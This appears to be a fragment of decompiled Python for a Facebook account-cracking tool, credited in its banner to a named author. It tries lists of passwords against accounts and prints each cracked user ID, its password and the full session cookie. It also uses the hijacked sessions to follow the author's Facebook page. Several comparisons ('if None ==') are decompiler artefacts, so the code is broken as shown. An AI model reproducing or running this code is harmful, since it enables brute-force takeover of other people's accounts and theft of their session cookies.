...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open +923411471937')
        return None
    if None == '4':
        os.system('xdg-open   https://chat.whatsapp.com/03411471937')
        return None
    if None == '0':
        os.system('exit')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/AHSAM.JOIYA', {
...
\033[1;32m \033[1;33mCREATED BY\33[0;m   : \033[1;33m [00] AHSAM UL HAQ JOIYA  \33[0;m\033[1;32m ðŸ”¥ \033[1;33m\33[0;m
\033[1;32m \033[1;32mFACEBOK      : \033[1;34m [00] AHSAM UL HAQ 
\033[1;32m \033[1;35mGITHUB       :  \033[1;35m[00]AHSAM
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('    \033[1;32m(AHSAM-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('    \33[1;30m(AHSAM-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
